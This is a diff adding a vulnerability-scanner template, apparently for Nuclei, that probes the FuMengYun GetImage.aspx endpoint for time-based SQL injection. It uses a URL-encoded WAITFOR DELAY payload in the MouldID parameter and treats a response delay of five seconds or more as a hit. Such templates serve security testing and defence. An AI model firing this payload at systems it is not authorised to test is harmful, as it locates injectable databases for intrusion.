@@ -1,0 +1,24 @@
+id: FuMengYun-GetImage-sqlInjection
+
+info:
+  name: FuMengYun-GetImage-sqlInjection
+  author: iSee857
+  severity: high
+  description: FuMengYun-GetImage-sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /Common/GetImage.aspx?MouldID=%2d%31%27%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%35%27%2d%2d HTTP/1.1
+        Host: {{Host}}
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
